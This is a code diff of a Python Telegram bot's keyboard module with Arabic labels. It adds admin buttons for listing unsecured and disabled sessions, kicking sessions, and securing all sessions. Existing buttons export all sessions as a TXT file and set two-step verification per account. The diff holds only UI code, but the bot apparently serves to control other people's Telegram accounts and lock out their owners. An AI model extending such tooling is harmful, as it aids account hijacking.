@@ -21,6 +21,7 @@ CB = {
     "name": "n",
     "twofa": "f",
     "kick": "k",
+    "kick_only": "ks",
     "verify": "v",
 }
 
@@ -135,20 +136,35 @@ def sessions_keyboard(
         buttons.append(nav)
 
     admin_tools = []
+    admin_tools.append(
+        InlineKeyboardButton(
+            text="🔓 الحسابات الغير مأمنه",
+            callback_data="list_unsecured",
+        )
+    )
+    admin_tools.append(
+        InlineKeyboardButton(
+            text="🔴 الجلسات المعطلة",
+            callback_data="list_disabled",
+        )
+    )
+    buttons.append(admin_tools)
+
+    admin_tools_2 = []
     if is_super_admin:
-        admin_tools.append(
+        admin_tools_2.append(
             InlineKeyboardButton(
                 text="🔍 فحص الجلسات",
                 callback_data="check_sessions",
             )
         )
-    admin_tools.append(
+    admin_tools_2.append(
         InlineKeyboardButton(
             text="🗑 حذف غير الصالحة",
             callback_data="purge_invalid",
         )
     )
-    buttons.append(admin_tools)
+    buttons.append(admin_tools_2)
     export_row = [
         InlineKeyboardButton(
             text="📥 سحب كل الجلسات (TXT)",
@@ -262,7 +278,7 @@ def user_messages_menu_keyboard() -> InlineKeyboardMarkup:
     ])
 
 
-def session_detail_keyboard(session_id: int) -> InlineKeyboardMarkup:
+def session_detail_keyboard(session_id: int, page: int = 0) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(
@@ -296,13 +312,19 @@ def session_detail_keyboard(session_id: int) -> InlineKeyboardMarkup:
             text="🔐 تعيين/تغيير التحقق بخطوتين",
             callback_data=cb("twofa", session_id),
         )],
+        [
+            InlineKeyboardButton(
+                text="🚫 طرد الجلسات فقط",
+                callback_data=cb("kick_only", session_id),
+            ),
+        ],
         [InlineKeyboardButton(
             text="🚫 طرد الجلسات + تنظيف شامل",
             callback_data=cb("kick", session_id),
         )],
         [InlineKeyboardButton(
             text="🔙 رجوع للقائمة",
-            callback_data="back_to_sessions",
+            callback_data=f"sessions_page_{page}",
         )],
     ])
 
@@ -311,3 +333,41 @@ def back_to_session_keyboard(session_id: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🔙 رجوع", callback_data=cb("session", session_id))]
     ])
+
+
+def unsecured_sessions_keyboard(sessions) -> InlineKeyboardMarkup:
+    buttons = []
+    for s in sessions:
+        sid = s["id"]
+        label = _session_label(s)
+        buttons.append([
+            InlineKeyboardButton(text=label, callback_data=cb("session", sid))
+        ])
+    
+    if sessions:
+        buttons.append([
+            InlineKeyboardButton(
+                text="🛡️ تأمين كل الجلسات (المتصلة الآن)",
+                callback_data="secure_all_unsecured",
+            )
+        ])
+    
+    buttons.append([
+        InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")
+    ])
+    return InlineKeyboardMarkup(inline_keyboard=buttons)
+
+
+def disabled_sessions_keyboard(sessions) -> InlineKeyboardMarkup:
+    buttons = []
+    for s in sessions:
+        sid = s["id"]
+        label = _session_label(s)
+        buttons.append([
+            InlineKeyboardButton(text=label, callback_data=cb("session", sid))
+        ])
+    
+    buttons.append([
+        InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")
+    ])
+    return InlineKeyboardMarkup(inline_keyboard=buttons)
